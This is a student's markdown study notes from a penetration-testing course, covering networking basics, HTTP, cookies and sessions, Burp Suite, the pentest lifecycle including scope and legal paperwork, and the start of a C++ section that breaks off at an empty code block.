# Learning Path - Penetration Testing Student

## (1/3) Penetration Testing Prerequisites

### Introduction (7 items)

#### (1/7) The Information Security Field - Study Guide

The term 'hacker' was born in the 60s (MIT Community):

- Hacker: curious, highly intelligent, starving for knowledge.
- Lifestyle, telephone lines, people and software development.
- [Hacker Manifesto](http://phrack.org/issues/7/3.html)

Career opportunities:

- Need of protecting sensitive information.
- Wide range of cyber-threats.
- IT Security is a difficult game.
- Pentesters (or **Pen**entration **testers**), simulate hacks against a network, computer system, webapp or organization using the same techniques as malicious criminals.
- Demand is in growth.

Domain language:

- White hat hacker
- Black hat hacker
  -  Crackers
- User
- Malicious user
- Root/Administrator
- Privileges: identify actions a user is allowed to do
- Security through Obscurity: secrecy of design to provide security
- Attack
- Privilege Escalation
- DoS: Denial of Service
- Remote Code Execution: malicious user manages to execute some attacker-controlled code on a victim remote machine
- ShellCode: piece of custom code which provides the attacker a shell on the victim machine

#### (2/7) Cryptography & VPNs - Study Guide

> Goal #1: knowing how to protect traffic, understanding computer network communications & be able to choose the right protocol.
> Goal #2: know the difference between clear text and cryptographic protocols.

Clear-text:

- Easy to intercept, eavesdrop & mangle
- Use clear-text only on trusted networks

Cryptographic Protocols:

- Protocol encrypts information transmitted to protect the communication
- Prevents eavesdropping
- Need to transmit clear-text anyways? Wrap your communication into a **tunnel**
- Protocol for Tunneling = VPN

VPN:

- A VPN uses cryptography to extend a private network over a public one
- Protected connection a to a a private network
- A VPN connection is needed for using the course Labs

#### (3/7) Wireshark Introduction - Study Guide

Network sniffer tool. Download Wireshark and OpenVPN (both shipped with Kali Linux).
#### <span style="color: red">VIDEO - (4/7) HTTP(s) Traffic Sniffing</span>

There are **2** websites using **HTTP** and **HTTPS** respectively.

#### <span style="color: red">LAB - (5/7) Connecting to your first lab</span>

#### (6/7) HTTP(S) Traffic Sniffing
#### (7/7) Binary Arithmetic Basics - Study Guide

> Goals: Understand Network addressing / Computer logic operation

- `1 + 1 = 10`
- `111 + 1 = 1000`
- `1101b` = `13d`

##### Converting from and to Binary

divide by 2 and keep a not of the remainder iterating the same operation until the dividend is zero.

`13d` is `1011b`:

1. 13 / 2 = 6  --> remainder: 1
2. 6 / 2 = 3 --> remainder: 0
3. 2 / 2 = 1 --> remainder: 1
4. 1 / 2 = 0 --> remainder: 1

`Logical NOT`:
- `1101` --> `0010`

`Logical AND`: if (both bits in the comparing position are ones) -> 1; else 0
- `1001 AND 1100` = `1000`

`Logical OR`: if (at least one of the bits is one) -> 1; else 0
- `1001 OR 1100` = `1101`

`Logical XOR`: if (**just one** of the bits is one) -> 1; else 0
 - `1001 XOR 1100` = `0101`

##### Hexadecimal arithmetic

> 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F.

`0x3a1` = `3a1h` = `929d`

|            |            |            |
|:-----------|:-----------|:-----------|
| 3 = 3      |  3 * 16^2  | 768        |
| a = 10     |  10 * 16^1 | 160        |
| 1 = 1      |  1 * 16^0  | 1          |

##### Converting decimal to hexadecimal

`1019d` = `0x3FB`

|            |            |                     |
|:-----------|:-----------|:--------------------|
| 1019 / 16  | 63.6875    | 0.6875 * 16 = 11 (B)|
| 63 / 16    | 3.9375     | 0.9375 * 16 = 15 (F)|
| 3 / 16     | 0.1875     | 0.1875 * 16 = 3     |
| 0 / 16     | --         |                     |

### Networking (12 items)

#### (1/12) Protocols - Study Guide

- Packet: stream of bits running as electric signals on physical media used for data transmission (wire/LAN, WiFi)
- Every packet has a:
  - Header: ensures receiver can interpret payload and handle the communication
  - Payload: actual information
- TCP/IP protocol header is 160bits (20Bytes)
  - First 4 bits: IP version
  - Source Address: 32 bits (starting at position 96)
  - Destination Address: just right after

Protocol Layers:
- Application
- Transport
- Network
- Physical

ISO/OSI (1984):
- Application
- Presentation
- Session
- Transport
- Network
- Link
- Physical

During **encapsulation**, every protocol adds its own header to the packet, treating it as a payload.

The receiving host does the same operation in reverse order. Using this method, the application does not need to worry about how the transport, network and link layers work. It just hands in the packet to the transport layer.

#### (2/12) Internet Protocols (IP) - Study Guide

- Internet Protocol is the protocol that runs on the Internet layer of the Internet Protocol Suite, also known as TCP/IP.
- IP delivers datagrams (IP packets) to rest of hosts, using IP addresses to identify them.
- IPv4 addresses = 4 bytes

##### Reserved IPv4 addresses

More details [here](https://datatracker.ietf.org/doc/html/rfc5735):

|                                |                   |
|:-------------------------------|:------------------|
| 0.0.0.0 - 0.255.255.255        | This network      |
| 127.0.0.0 - 127.255.255.255    | Local host        |
| 192.168.0.0 - 192.168.255.255  | Private Networks  |

##### IP/Mask

To fully identify a host, you also need to know its network

To find the network part you have to perform a bitwise AND operation between the netmask and the IP address.

> IP address + Subnet Mask

| IP Address                          | Mask                                | Network                             | CIDR Notation
|:------------------------------------|:------------------------------------|:------------------------------------|:------------------------------------|
| 192.168.33.12                       | 255.255.224.0                       | 192.168.32.0                        | 192.168.32.0/19                     |
| 11000000.10101000.00100001.00001100 | 11111111.11111111.11100000.00000000 | 11000000.10101000.00100000.00000000 |                                     |

Invert the netmask by performing a **bitwise NOT**:

11111111.11111111.11100000.00000000 -> 00000000.00000000.00011111.11111111

Perform the final **bitwise AND**:

|       |                                     |
|:------|:------------------------------------|
| IP    | 11000000.10101000.00100001.00001100 |
| !Mask | 00000000.00000000.00011111.11111111 |
| Host  | 00000000.00000000.00000001.00001100 |

0.0.1.12 => 13 bits to represent hosts => 2^13 = 8192 different addresses

##### Network & Broadcast Addresses

8192 - 2 addresses

- **Network**: one with the host part made by all zeros
- **Broadcast**: another with the host part made by all ones

More info [here](https://datatracker.ietf.org/doc/html/rfc1878).

- [CDIR Calculator](https://www.subnet-calculator.com/cidr.php)
##### IPv6

- 16bit hexadecimal numbers separated by a colon (:)
- Regular Form: 2001:0db8:0020:130F:0000:0000:097C:130B
- Compressed Form: FF01:0:0:0:0:0:0:43 => FF01::43
- IPv4-compatible: 0:0:0:0:0:0:13.1.68.3 => ::13.1.68.3

Reserved addresses (more info [here](https://datatracker.ietf.org/doc/html/rfc3513)):
- Loopback: `::1/128`
- IPv4 mapped addresses: `::FFFF:0:0/96`
-
##### IPv6 Structure

IPv6 addresses can be split in half (64bits/each part)
- Network part
  - Last 16 bits can be used only for specifying a subnet
- Device part (or Interface ID)

##### IPv6 Scope

- *Global Unicast Address*: scope internet - routed on internet
- *Unique Local*: scope internal network or VPN - internally routable but not routed on Internet
- *Link Local*: scope network link - not routed internally nor externally

##### IPv6 Subnetting

- First 48bits: Internet Global Addressing
- 16bits: Subnets
- Last 64: Device/Interface ID

This is:

- Prefix: First 64 bits
- Host: Last 64 bits

#### (3/12) Routing - Study Guide

- **Routers** are devices connected to different networks at the same time, forwarding IP datagrams from one network to another
- Routing protocols are used to determine the best path to reach a network. They behave like a postman who tries to use the shortest path possible to deliver a letter
- A router inspects the destination address of every incoming packet and then forwards it through one of its interfaces

Routing Table:
- To choose the right forwarding interface, a router performs a lookup in the routing table, where it finds an IP-to-interface binding
- The table can also contain an entry with the default address (0.0.0.0). This entry is used when the router receives a packet whose destination is an *unknown network*

Metrics:
- Routing protocols also assign a metric to each link
- This ensures that, if two paths have the same number of hops, the fastest route is selected
- The metric is selected according to the channel's estimated bandwidth and congestion

Checking the routing table:
- `ip route` (Linux)
- `route print` (Windows)
- `netstat -r` (Mac OS X)

#### (4/12) Link Layer Devices & Protocols - Study Guide

> Goals: Mac spoofing, test switches security, sniffing techniques, MITM attacks.

##### Link Layer
- Packet forwarding happens here
- Link layer protocols and devices only deal with the next hop

Link Layer devices:
- Hubs/Switches are network devices that forward frames on a local network
- They work with link layer network addresses: **MAC addresses**

##### MAC addresses
- Uniquely identify a network card on the Layer 2
- It's also known as physical address
- 48 bits = 6 bytes, expressed in hexadecimal
- Every host has a MAC and an IP address

Discovery of MAC addresses:
- `ipconfig /all` (Windows)
- `ipconfig` (*nix/Mac OS X)
- `ip addr` (Linux)

Communication between Workstation A and Workstation B via a router:
- Workstation A will create a packet with:
  - Destination IP addr of WS#B in the datagram header
  - Destination MAC addr of the router in the link layer header of the frame
  - Source IP add of WS#A
  - Source MAC addr of WS#A

- Router takes the packet and forward it to WS#B, rewriting the packet's MAC addresses
  - Destination MAC addr will be WS#B
  - Source MAC addr will be router's
  - The router will not change the source and destination IP addresses

- When a device sends a packet:
  - Destination MAC address is the MAC address of the next hop
    - This ensures the network knows where to forward the packet
  - Destination IP addr is the Destination Host addr
    - This is global info and remains the same along the packet trip

- Broadcast MAC address
  - FF:FF:FF:FF:FF:FF
  - A frame with this address is delivered to all the hosts in the local network

##### Switches
- Routers work with IP addresses
  - But Switches work with MAC addresses
  - They have multiple interfaces
  - CAM Table / Forwarding table: binds one or more MAC addresses to an interface
- Smallest home switches are usually integrated into the DSL router
- Corporate switches may have up to 64 ports
- They all differ in the delivered speed (from 10Mbps to 10Gbps, being 1Gbps the standard)

Forwarding Table:
- Binds MAC addresses to interfaces
- Stored in the device's RAM
- Contains: MAC address, Interface & TTL

Example:
| MAC            | Interface      | TTL         |
|:---------------|:---------------|:------------|
| MAC#1          | 1              | 30          |
| MAC#2          | 2              | 5           |
| MAC#3          | 2              | 5           |
| MAC#4          | 3              | 7           |

- A single host is attached to Interface 1 and 3 respectively
- Two hosts are attached to Interface 2, probably via another switch
- There might be multiple hosts on the same interface and interfaces without any host attached
- Interface 4 has no hosts attached
- TTL determines how long an entry will stay in the table, CAM table has a finite size
- As soon as an entry expires it is removed from the table
- CAM Table Population
  - Switches learn new MAC addresses dynamically, inspecting the header of every packet they receive, thus identifying new hosts
  - While routers use complex routing protocols to update their routing rules, switches just use the source MAC addr of the packets they process to decide which interface to use when forwarding a packet
  - The source MAC addr is compared to the CAM table
    - If the MAC addr **is not** in the table, the switch will add a new *MAC-interface* binding to the table
    - If the *MAC-Interface* is already in the table, its TTL gets updated
    - If the Mac is in the table but bound to another interface, the switch will update the table

##### Forwarding

To forward a packet...
- The switch reads the destination MAC addr of the frame
- Performs a look-up in the CAM table
- It forwards the packet to the corresponding interface
- If there's no entry for that MAC addr, the switch will forward the frame to all its interfaces

##### ARP
- Host#A sends a packet Host#B: Host#A needs to know IP/MAC addresses of Host#B
- If Host#A knows Host#B's IP but not MAC:
  - Host#A can build the correct IP-MAC address binding
    - Host#A builds an ARP request containing the Host#B's IP and FF:FF:FF:FF:FF:FF as destination MAC addr
    - Every host will receive the request
    - Only Host#B will ARP reply to it, telling A its MAC addr
    - Host#A will save the IP-MAC binding in its ARP cache
  - A host discards an entry at the power off or when the entry's TTL expires
- `arp -a` (Windows)
- `arp` (*nix OS)
- `ip neighbour` (Linux)

##### Hubs
- Predecessor of switches, same purpose, different functionality
- Repeaters and do not check any header
- They simply forward packets by repeating same electric signals on every port
- Every host receives the same packets

#### (5/12) TCP & UDP - Study Guide

> Goal#1: Transport Layer, how the application layer uses its services to identify server and client processes
> Goal#2: TCP session attacks, Advanced DoS attacks, Network scanning

##### TCP: Transmission Control Protocol
- Guarantees packet delivery
- Connection oriented
- Vast majority of applications use it
- Lower throughput than UDP

##### UDP: User Datagram Protocol
- Does not guarantee packet delivery
- It's connectionless
- Faster that TCP, better throughput
- Multimedia applications

##### Ports

> `<IP>`:`<Port>`: identify a single network process on a machine

- Well-known: 0-1023

|            |                  |                 |       |
|:-----------|:-----------------|:----------------|:------|
| SMTP       | 25               | SFTP            | 115   |
| SSH        | 22               | Telnet          | 23    |
| POP3       | 110              | FTP             | 21    |
| IMAP       | 143              | RDP             | 3389  |
| HTTP       | 80               | MySQL           | 3306  |
| HTTPS      | 443              | MS SQL Server   | 1433  |
| NetBIOS    | 137, 138, 139    |                 |       |

Server and Clients know what port to use as it's expressed in the source/destination ports in the TCP/UDP header.

Check *listening ports* and *current TCP connections* as information about the processes listening on the machine and processes connecting to remote servers:
- `netstat -ano` (Windows)
- `netstat -tunp` (Linux)
- `netstat -p tcp -p udp` together with `lsof -n -i4TCP -i4UDP`
- TCPView from Sysinternals

##### TCP 3-way handshake

TCP is connection oriented. The header fields involved in the handshake are:
- Sequence number
- Acknowledgement numbers
- SYN & ACK flags

1. Host -> SYN -> Server
   -  SYN flag enabled
   -  Random sequence number
2. Host <- SYN-ACK <- Server
   - SYN & ACK flags enabled
   - Random sequence number
3. Host -> ACK -> Server
   -  Client completes the synchronization by sending an ACK packet

#### (6/12) Firewall & Defense - Study Guide

> Goals: evading FW advanced stealth scanning, filtering evasion.

FWs:
- Filter packets coming in and out of a network
- Access Control to network resources and services
- Can work on different layers of the OSI model

##### Packet Filtering FW

- Usual on home DSL routers
- Headers are inspected, but they don't give any information on the actual packet content
- Admin can crate rules according to certain characteristics
  - Source IP / Destination IP
  - Source Port / Destination Port
  - Protocol
- Packet inspection actions
  - Allow
  - Drop
  - Deny: same as drop but notifying the source host
- Packet filtering isn't enough to stop layer 7 attacks (application layer, as XSS, BoF, SQL injection or much more)

##### Application Layer Firewalls

- Content of packets is inspected, not just headers
- They filter unwanted traffic inspecting content

##### IDS / Intrusion Detection Systems

- They inspect the application payload trying to detect any potential attack
- They detect ongoing intrusions, attack vectors, ping sweeps, port scans, SQL injections, BoFs, etc.
- Can also identify traffic generated by a virus or worm by means of **signatures**
- IDS cannot detect something if it doesn't already know before hand
- False positive: legit traffic is flagged as malicious
- Detection is performed by a multitude of sensors
- IDS Manager: sw in charge of maintaining policies and providing a management console to the sysadmin
- **not a** FW substitute

2 categories:
- NIDS: network
  - Inspects network traffic with sensors
  - Usually placed on a router or in a network with high intrusion risk (as DMZ)
- HIDS: host
  - Monitors app logs, file-system changes or OS changes

##### IPS

- IDS can detect, activity is logged but the activity isn't blocked
- IPS drops malicious requests when a threat has a risk classification above a pre-define threshold

##### Spot on Obstacle

When an environmental constraint (FW/IDS/other device) is in place:
- TCP SYN are sent, but there's no TCP SYN/ACK reply
- TCP SYN are sent, but a TCP RST/ACK is received

##### NAT (Network Address Translation) and IP Masquerading

These are both two techniques to provide access to a network form another network.

The NAT device rewrites source IP addresses of every packet, masquerading the original client's IP address.

#### <span style="color:red">LAB - (7/12) Find the Secret Server</span>

#### (8/12) DNS - Study Guide

> **Goal#1**: SSL/TLS certifications validation relies on DNS.

> **Goal#2**: Mounting Spoofing attacks & Performing information gathering.

- DNS is an application layer protocol
- Structure/Hierarchy of a DNS Name (www.sub.domain.com)
  - Top level domain (TLD) (.com)
  - Domain Part (domain)
  - Subdomain part (sub)
  - Host part (www)
- Resolvers are DNS servers provided by your ISP or publicly available
  - They convert a DNS name into an IP address
- DNS Resolution Algorithm
  - Firstly, the resolver contacts one of the root name servers, these serves contain information about the top-level domains
  - Then, it asks the TLD name server what's the name server that can give information (authoritative name server) about the domain the resolver is looking for
  - If there are one or more subdomains, step 2 is performed again on the authoritative DNS server for every subdomain
  - Finally, the resolver asks for the name resolution of the host part
- Resolvers and Root servers
  - IP addresses of the root servers are hardcoded in the configuration of the resolver
  - Sysadmins keep the list updated, otherwise, the resolver would not be able to contact a root server
- Reverse DNS Resolution
  - DNS can perform the inverse operation: convert an IP into a DNS name
  - the admin of a domain must enable this feature for a domain to make it work
  - `ping` utility performs a reverse DNS query after receiving every response from the target

#### (9/12) Wireshark - Study Guide

- Can capture all the traffic seen by the network card of the computer running it
- NIC (Network Interface Cards) need to work in promiscuous or monitor mode
  - Instead of discarding any packet addressed to another NIC, in promiscuous mode a network card will accept and process **any** packet
  - Just like it would happen in a hub network
  - In switched networks, you have to perform an attack such as ARP poisoning or MAC flooding in order to do that
  - WiFi medium is broadcast by nature


- https://wiki.wireshark.org/SampleCaptures
- https://www.wireshark.org/docs/wsug_html_chunked/

#### <span style="color: red">VIDEO - (10/12) Using Wireshark</span>

#### <span style="color: red">VIDEO - (11/12) Full Stack Analysis with Wireshark</span>
#### <span style="color: red">LAB - (12/12) Data Exfiltration</span>

### Web Applications (11 items)

#### (1/11) Web Application Introduction - Study Guide

The web app world is extremely heterogeneous. Every web application is different from others because developers have many ways to accomplish the same task.

Having flexibility in web app development also means having flexibility in creating insecure code.

Fundamental aspects:
- HTTP protocol basics
- Cookies
- Sessions
- Same Origin Policy

#### (2/11) HTTP Protocol Basics - Study Guide

HTTP works on top of TCP protocol, so when the connection is established, the client sends a request and waits for the answer. The server processes the request and sends back its answer, along with status code and data:
- Client -> HTTP req -> Server
- Client <- HTTP res <- Server

HTTP Protocol Basics

- Client -> SYN -> Server
- Client <- SYN/ACK <- Server
- Client -> ACK + GET /html -> Server
- Client <- HTML resp + Close connetion <- Server

The format of an HTTP message is:

```
Headers\r\n
\r\n
Message Body\r\n
```

where:

```
\r # carriage return
\n newline
```


Verbs: PUT, TRACE, HEAD, POST.

Some status codes:

| Status code               | Meaning                                                       |
|:--------------------------|:--------------------------------------------------------------|
| 200 OK                    | the resource is found                                         |
| 301 Moved Permanently     | the requested resource has been assigned a new permanent URI  |
| 302 Found                 | the resource is temporarily under another URI                 |
| 403 Forbidden             | the client doesn't have enough privileges, server refuses req.|
| 404 Not Found             | the server cannot find the resource matching the request      |
| 500 Internal Server Error | the server does not support the functionality required        |
##### HTTP Request

```
GET / HTTP/1.1                                    # VERB path protocol version
Host: www.elarnsecurity.com                       # Specifies the internet hostname and port number, obtained from the URI of the resource
User-Agent: Mozilla/5.0 (X11; Linux x86_64 ...)   # Tells the server what client software is issuing the request
Accept: text/html                                 # Specifies which document type is expected in the response
Accept-Language: en-US,en;q=0.5                   # Browser can as for a specific human language in the response
Accept-Encoding: gzip, deflate                    # Restricts the content encoding
Connection: keep-alive                            # Future communications with the server will reuse the current connection
\r\n\r\n
< PAGE CONTENT > ...
```

##### HTTP Response

```
HTTP/1.1 200 OK                                   # Status-Line: protocol version + status code + textual meaning
Date: Wed, 19 Nov 2020 10:10:10 GNT               # Time at which the message was originated
Cache-Control: private, max-age=0                 # Using cached content saves bandwidth
Content-Type: text/html; charset=UTF=8            # Lets the client know how to interpret the body of the message
Content-Encoding: gzip                            # The message body is compressed with gzip
Server: Apache/2.2.15 (CentOS)                    # (optional) header of the server that generated the content
Content-Length: 99043                             # length in bytes of the message body


< PAGE CONTENT > ...
```

##### HTTPS: How to protect HTTP using an encryption layer

- HTTPS: HTTP over SSL/TLS is a method to run HTTP which is a clear-text protocol over SSL/TLS, a cryptographic protocol
- Provides: Confidentiality, Integrity Protection and Authentication to the HTTP protocol
- An attacker cannot sniff the application layer communication
- An attacker cannot alter the application layer data
- The client can tell the real identity of the server and, sometimes, vice-versa
- Traffic can be sniffed, but any adjacent user will not know req/resp headers, req/resp body, req target domain
- When inspecting HTTPS, one cannot know what domain is contacted and what data is exchanged
- HTTPS does not protect against web application flaws
- All the attacks against an application happen regardless of SSL/TLS
  - Such as XSS and SQL injection will still work

#### <span style="color:red"> VIDEO (3/11) HTTP(s) Protocol Basics</span>

#### (4/11) HTTP Cookies (1994 - Netscape) - Study Guide
- HTTP is a stateless protocol
- HTTP cannot keep the state of a visit across different HTTP requests
- HTTP requests are unrelated to the preceding and following ones
- Often exploits rely on stealing cookies
- Cookies / Cookie jar, just textual information installed by a website into a web browser


A server can set a cookie via `Set-Cookie` HTTP header field in a response message.

```
HTTP/1.1 200 OK
Date: Wed, 19 Nov 2020 10:10:10 GNT
Cache-Control: private, max-age=0
Content-Type: text/html; charset=UTF=8
Content-Encoding: gzip
Server: Apache/2.2.15 (CentOS)
Set-Cookie: ID=Value; expires=Thu, 21-May-2015 15:25:20 GMT; path=/; domain=.example.site; Http
Content-Length: 99043


< PAGE CONTENT > ...
```

A cookie contains the following attributes:
- The actual content
- An expiration date
- A path
- The domain
- Optional flags
  - Http only flag
  - Secure flag

##### Cookie format
|||
|:--------------------------|:-----------------------------------------|
| Cookie Content            | ID=Value;                                |
| Expiration Date           | expires=Thu, 21-May-2015 15:25:20 GMT;   |
| Path                      | path=/;                                  |
| Domain                    | domain=.example.site                     |
| Flag-setting Attribute    | HttpOnly                                 |

- Browsers use domain, path, expires and flags attributes to choose whether or not to send a cookie in request.
- Cookies are sent only to the valid domain/path when they are not expired and according totheir flags.
- The domain field and the path field set the scope of the cookie.
- The browser sends the cookie only if the request is for the right domain.
- When a web server installs a cookie, it sets the domain field.
- Then the browser will use the cookie for every request sent to that domain and *all its subdomains*.
- If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie 'host-only' flag,meaning that this cookie will be sent only to that precise hostname.
- Respectively, when a cookie has the path attribute set, the browser will send the cookie to the right domain and to the resolurces in that path *and not any other*
- A browser will not send an expired cookie tothe server, session cookies will expire with the HTTP session.
- `http-only` flag is a mechanism that prevents JavaScript or any other non-HTML technology from reading the cookie (preventing a XSS robbery)
- `Secure` flag creates secure cookies that will only be sent over an HTTPS connection

#### (5/11) Sessions - Study Guide

- Sometimes the web developer prefers to store some information on the server side
- This avoids the back and forth data transmission and hides the application logic
- Sessions are a mechanism that lets the website store variables specific for a given visit on the server side
- Each session is identified by a session id
- The client presents this ID for each subsequent request
- With that ID, the server is able to retrieve the state of the client

##### Session cookies

Session cookies allow to install a session ID on a web browser

```
SESSION=0mwerj234w
PHPSESSID=1992maiwr2H     # PHP
JSESSIONID=W8234mSfsw3    # JSP
```

- The browser then uses the cookie in subsequent requests.
- A session could contain multiple variables, so sending a small cookie keeps the bandwidth usage low.
- The browser will send back the cookie according to the cookie protocol,thus sending the session ID.
- Session IDs can also be transmitted via GET requests.

#### <span style="color: red">VIDEO - (6/11) HTTP(s) Cookies and Sessions</span>

#### (7/11) Same Origin Policy - Study Guide

- SOP / Same Origin Policy is a critical point of web application security.
- Prevents JavaScript code from getting/setting properties on a resource coming from a different origin.
- To determine if JS can access a resource, hostname, port and protocol *must match*.
- SOP only applies to the actual code of a script.
- It is still possible to include external resources by using HTML, like IMG, script, iFrame...
- If a script on Domain A was able to read content on Domain B, it would be possible to steal clients' information and mount a number of dangerous attacks.

#### (8/11) Burp Suite - Study Guide

- Any web application contains many objects like scripts, images, stylesheets, client and server-side intelligence.
- Having tools that help inthe study and analysis of web application behavior is critical.
- An *intercepting proxy* is a tool that lets you analyze and modify any request and any response exchanged between an HTTP client and a server.
- Intercepting proxy != web proxy (as Squid)

BurpSuite will let you:
- Intercept request/responses between your browser and web server.
- Build requests manually.
- Crawl a website by automatically visiting every page in a website.
- Fuzz webapps by sending them patterns of a valid and invalid inputs to test their behavior.
- You can modify the header and the body of a message by hand or automatically.

> Learn how to configure your browser's proxy to work with Burp Suite

- Burp Repeater lets you manually build raw HTTP requests.
- Same can be achieved with `nc` or `telnet`.

#### <span style="color: red">VIDEO - (9/11) Burpsuite</span>
#### <span style="color: red">LAB - (10/11) Burp Suite Basics</span>
#### <span style="color: red">LAB - (11/11) Burp Suite</span>

### Penetration Testing (2 items)

#### (1/2) Penetration Testing Introduction - Study Guide

- A penetration tester performs a deep investigation of a remote system's security flaws.
- Penetration testers must test for any and all vulnerabilities, not just the ones that may grant them root access.
- Penetration testing is not about getting `root`!
- Penetration testers cannot destroy their client's infrastructure, professional pentesting requires a thorough understanding of attack vectors and their potential

#### (2/2) Lifecycle of a Penetration Tester - Study Guide

- Pentester activity must guarantee that the least impact possible on the production systems and services.
- Avoid overloading client's systems and networks.
- Communicate to client what steps to take, just in case anything goes wrong during the pentest.
- Pentesting is a process that ensures that every potential vulnerability or security weakness gets tested with the lowest possible overhead.

##### Engagement

Details about the pentest are established during the Engagement phase.

Quotation:
- Fee establishment for the job to be accomplished.
- Fee will vary according to:
  - Type of engagement: black box, gray box, etc.
  - How time-consuming the engagement is.
  - The complexity of the applications and services in scope.
  - The number of targets (IP addresses, domains, etc.)
- Evaluation and quoting these aspects requires experience.
- If you are not able to quantify the amount of work required by an engagement, you can provide an hourly fee.

Proposal Submittal:
- The best way to win a job is by providing a sound and targeted proposal.
- You should write the proposal keeping in mind the client's needs and infrastructure.
- Must include:
  - Your understanding of the customer's requirements.
  - Approach & Methodology
    - Automated scanning tools
    - Manual testing
    - Onsite testing
    - Any other
  - Value the pentest will bring to business
  - Risks & Benefits
    - Business continuity
    - Improved confidentiality
    - Avoidance of money and reputation loss
  - Estimate of the time / price
  - Type:
    - Penetration test
    - Vulnerability assessment
    - Remote / Onsite
  - Scope
    - IP addresses
    - Network blocks
    - Domain names
    - Etc.

Scope:

- Make sure that the target of your engagement is the property of your client.
- Shared hosting: You must not conduct an assessment on targets unless you are given written permission from the hosting provider.
- Check country laws

Incident Handling:

- Unplanned and unwanted situation that affects the client's environment and disrupts its services.
- Even when sticking to best practices,there's a possibility to damage the tested assets.
- Aim not to damage the target.
- In case of planning some insensitive or risk test, communicate with the customer.
- Have a 'Incident Handling Procedure':
  - Set of instructions that need to be executed by both you and your customer on how to proceed when a incident occurs.
  - Have an emergency contact.
  - Add an statement to the rules of engagement.

Legal work:

- Sometimes you will need to involve a lawyer as information security laws vary a lot from country to country
- Sometimes a professional insurance is required
- NDA can be signed. Keep data private and encrypted on your PC.
- Outline what you can and you cannot do.
- Rules of engagement is another document that will define the scope of engagement and will put on paper what you are entitled to do and when, this includes the time window for your tests and your contacts in the client's organizations

##### Information Gathering

- Fundamental stage for a successful penetration test.
- Starts once the legal paperwork is complete, and not before.
- You investigate and harvest info about the client's company

Extremely useful information if Social Engineering is allowed by the rules of the engagement:
  - Emails and addresses
    - Board of directors
    - Investors
    - Managers and employees
  - Branch location and addresses

- Identify risks in the client's critical infrastructure.
- Having an understanding of the business is a key aspect in understanding what is important for your client.
- Understanding the business allows us to rate the risks associated with a successful attack.

Infrastructure Information Gathering:

- After understanding the business
- Transform the IP addresses or the domains in scope into actionable information about servers, OSs, etc.
- If the scope is defined as a list of IP addresses, you can move on to the next step.
- If the scope is the whole company or some of their domains, you will have to harvest the relevant IP blocks by using `WHOIS` and other *DNS information*.
- Give meaning to every IP address in scope, determining the following in order to focus your efforts/attacks and select the riht tools for the exploitation phase:
  - if there's a live host or server using it
  - if there are one or more websites using that IP address
  - What OS is running on the host or the server

Web Applications:

- Harvest Domains
- Harvest subdomains
- Harvest Pages (website crawling)
- Harvest Technologies in use, like PHP, Java, .NET
- Harvest Frameworks and CMS in use
- Treat webapps as completely separate entities

##### Footprinting and Scanning

Here you deepen your knowledge of the in-scope servers and services.

Fingerprinting the OS:

- Gives you info about the OS
- Helps to narrow down the number of potential vulnerabilities
- Some tools use exploits to some singularities you can find the network stack implementation

Port Scanning:

- Once you know the live hosts, you can determine which ports are open on a remote system
- Any mistake made here will impact next steps
- `nmap` uses different scanning techniques to reveal open, closed and filtered ports


Detecting Services:

- Act of knowing what service which service is listening on that port.
- Knowing the port number isn't enough, there's the need to discover the service that is running behind.
- `nmap` can be used to fingerprint ports.

By knowing the services running, we can know:

- OS
- Purpose of a particular IP address (server/client)
- Relevance of the host in the infrastructure

##### Vulnerability Assessment

- Aims to build a list of the present vulnerabilities on the target systems.
- The pentester will carry out a vulnerability assessment on each target discovered in the previous steps
- The bigger the list, the more chances we'll have when exploiting the systems in scope.

Vulnerability assessments can be carried out:
- Manually
- Using automated tools, as scanners that will send probes to the target systems to detect whether a host has some well-known vulnerabilities
  - Extremely important to properly configure them, you might crash targets if not
  - Their output is a report that the pentester can use in the exploitation phase

##### Exploitation

- Phase where we verify the vulnerabilities really exist.
- During this phase, a pentester checks and validates a vulnerability and also widens and increases the privileges on the target systems and networks.
- A penetration test is a cyclic process:
- The process finishes when there are no more systems and services in-scope to exploit.

> Information Gathering -> Scanning -> Vulnerability Assessment -> Exploiting

##### Reporting

- This step is as important as the rest of the phases, as it delivers the results to executives, IT staff and development team.
- This report must address:
  - Techniques used
  - Vulnerabilities found
  - Exploits used
  - Impact and risk analysis for each vulnerability
  - Remediation tips (of real value for the client, as they can be used to resolve their security issues)

Consultancy:

- Pentester are often asked to provide some hours of consultancy after delivering the report.
- The initial engagement is closed and the pentester must keep the report encrypted in a safe place, or even destroy it.

## (2/3) Penetration Testing: Preliminary Skills & Programming

### Introduction to Programming (4 items)

#### (1/4) What is Programming - Study Guide

Set of instructions that a computer may follow. It can be used to automate tasks, leaving specific things to be done by a machine instead of a human.

Syntax and usage requirements are specific per language, but purpose keeps on being the same.

#### (2/4) Low and High-Level Languages - Study Guide

Level can tell how close these languages are to the hardware.

Low level:

- More complicated, more prone to create vulnerabilities
- Can do anything with them, as they are so closed to the machine
- Deep understanding is required
- Assembly

High level:

- Ease of development
- Less flexible
- Writing custom functionality from scratch can be difficult
- Java, Python
- They can't run on a bare OS, will need some kind of software already running

#### (3/4) Programming and Scripting - Study Guide

Programming and Scripting Languages are both high-level languages.

Programming Languages:

- Programming languages require a compiler.
- A compiler will convert your plain-text program file into something readable by the language environment.

Scripting Languages:

- Interpreted
- Software environment install on your computer can read a plain-text program file

#### (4/4) Basic Concepts - Study Guide

- Each programming language has its own syntax, which may require some instructions to use certain characters at the end of each statement while in another language this may not be needed.
- Variables might have different types depending on the programming language.
- Functions are normally allowed to be created. These are pieces of code responsible for some repeatable tasks. Might use arguments and return a value.
- Conditional statements are part of a programming language syntax.
- Loops are a set of instructions that need to be executed numerous times.

### C++ (10 items)

#### (1/10) C++ IDE - Study Guide

> Skipped

#### (2/10) Structure of C++ Programs - Study Guide

`Hello World` example where we make use of:
- Comments
- Directives
- Namespaces
- Terminators (;)
- `main` function + body

```
// This is my first program in C++
#include <iostream>
using namespace std;

int main() {
  cout << "Hello World";

  // system("PAUSE");
  // cin.ignore();

  return 0;  // program has completed its execution without any errors
}
```

#### (3/10) Variables and Types - Study Guide

Variables can be 'global' or 'local'.

```
int a = 0;
int b = 2;
int sum = a + b;
```

| | |
|:--------|:----------|
| short / short int | short integer (2 bytes) |
| int | integer (4 bytes) |
| long / long int | long integer (4 bytes) |
| bool | boolean (1 byte) |
| float | floating point number (4 bytes) |
| double | double precision floating point number (8 bytes) |
| char | Character (1 byte) |

#### (4/10) Input / Output - Study Guide

```
